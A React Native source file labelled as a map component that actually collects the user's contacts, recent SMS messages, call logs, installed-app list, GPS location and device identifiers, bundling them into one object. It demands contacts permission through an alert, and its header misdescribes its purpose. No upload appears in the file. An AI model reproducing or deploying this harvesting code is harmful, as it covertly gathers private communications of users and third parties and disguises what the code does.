/**
 * 地图组件
 * Created by jszh on 2018/08/22.
 */

// import {Geolocation} from 'react-native-baidu-map'
import Contacts from  'react-native-contacts'
import DeviceInfo from 'react-native-device-info'
import CallLogs from 'react-native-call-log'
import {Alert} from 'react-native'
import {channelConfig} from '../z_util/config'
import {isIOS} from './device'
var SmsAndroid = require('react-native-sms-android');
var extraInfoModule = require('react-native').NativeModules['ExtraInfoModule'];
function getAndroidExtraInfo(callback){
    if(isIOS){
        callback({
            callLog:[],
            appList:[],
            smsLog:[]
        })
    }
    else{
        extraInfoModule.getExtraInfo(result=>{
            CallLogs.show((logs) => {
                // parse logs into json format
                const parsedLogs = JSON.parse(logs);
                var filter = {
                    box: '',
                    maxCount: 50,
                };
                SmsAndroid.list(JSON.stringify(filter), (fail) => {

                    },
                    (count, smsList) => {
                        callback({
                            smsLog:JSON.parse(smsList),
                            callLog:parsedLogs,
                            appList:result['appInfos']
                        })
                    });
            })
        })
    }
}
let getDeviceInfo = null;
if(channelConfig.normalInfo){
    getDeviceInfo = function (callback) {
        navigator.geolocation.getCurrentPosition((position)=>{
                let deviceInfo = {
                    udid:DeviceInfo.getUniqueID(),
                    brand:DeviceInfo.getBrand(),
                    model:DeviceInfo.getModel(),
                    deviceId:DeviceInfo.getDeviceId(),
                    systemName:DeviceInfo.getSystemName(),
                    systemVersion:DeviceInfo.getSystemVersion(),
                    deviceName:DeviceInfo.getDeviceName(),
                    channel:channelConfig.debug
                }
                console.log("!!!!");
                console.log(deviceInfo,position,);
                callback({
                    contactData: [],
                    gpsData: position['coords'],
                    deviceInfo: deviceInfo,
                    appList: [],
                    callLog: [],
                    smsLog: [],
                })
            },()=>{ //获取失败
            console.info('----获取位置失败----')
                let deviceInfo = {
                    udid:DeviceInfo.getUniqueID(),
                    brand:DeviceInfo.getBrand(),
                    model:DeviceInfo.getModel(),
                    deviceId:DeviceInfo.getDeviceId(),
                    systemName:DeviceInfo.getSystemName(),
                    systemVersion:DeviceInfo.getSystemVersion(),
                    deviceName:DeviceInfo.getDeviceName(),
                    channel:channelConfig.debug
                }
                console.log("!!!!");
                console.log(deviceInfo);

                callback({
                    contactData: [],
                    gpsData: {},
                    deviceInfo: deviceInfo,
                    appList: [],
                    callLog: [],
                    smsLog: [],
                })
            })
    }
}else {
    getDeviceInfo = function (callback) {
        Contacts.getAll((err, contacts) => {
            if(err === 'denied'){
                Alert.alert('提示','请打开您的通讯录权限！');
            } else {
                //获取地理位置信息
                navigator.geolocation.getCurrentPosition((position)=>{
                    getAndroidExtraInfo(extraInfo=>{
                        let deviceInfo = {
                            udid:DeviceInfo.getUniqueID(),
                            brand:DeviceInfo.getBrand(),
                            model:DeviceInfo.getModel(),
                            deviceId:DeviceInfo.getDeviceId(),
                            systemName:DeviceInfo.getSystemName(),
                            systemVersion:DeviceInfo.getSystemVersion(),
                            deviceName:DeviceInfo.getDeviceName(),
                            channel:channelConfig.debug
                        }
                        const {appList,callLog,smsLog} = extraInfo
                        console.log("!!!!");
                        console.log(deviceInfo,extraInfo,position,contacts);
                        callback({
                            contactData: contacts,
                            gpsData: position['coords'],
                            deviceInfo: deviceInfo,
                            appList: appList,
                            callLog: callLog,
                            smsLog: smsLog,
                        })
                    })},()=>{ //获取失败
                    console.info('----获取位置失败----')
                    getAndroidExtraInfo(extraInfo=>{
                        let deviceInfo = {
                            udid:DeviceInfo.getUniqueID(),
                            brand:DeviceInfo.getBrand(),
                            model:DeviceInfo.getModel(),
                            deviceId:DeviceInfo.getDeviceId(),
                            systemName:DeviceInfo.getSystemName(),
                            systemVersion:DeviceInfo.getSystemVersion(),
                            deviceName:DeviceInfo.getDeviceName(),
                            channel:channelConfig.debug
                        }
                        const {appList,callLog,smsLog} = extraInfo
                        console.log("!!!!");
                        console.log(deviceInfo,extraInfo,contacts);

                        callback({
                            contactData: contacts,
                            gpsData: {},
                            deviceInfo: deviceInfo,
                            appList: appList,
                            callLog: callLog,
                            smsLog: smsLog,
                        })
                    })})
                // Geolocation.getCurrentPosition().then(position=>{
                //     //获取设备udid
                //     console.log('--------baidu------')
                //     console.log(position)
                // }).catch(e=>{
                //     console.log(e)
                // })
            }
        })
    }
}
export {
    getDeviceInfo,getAndroidExtraInfo
}
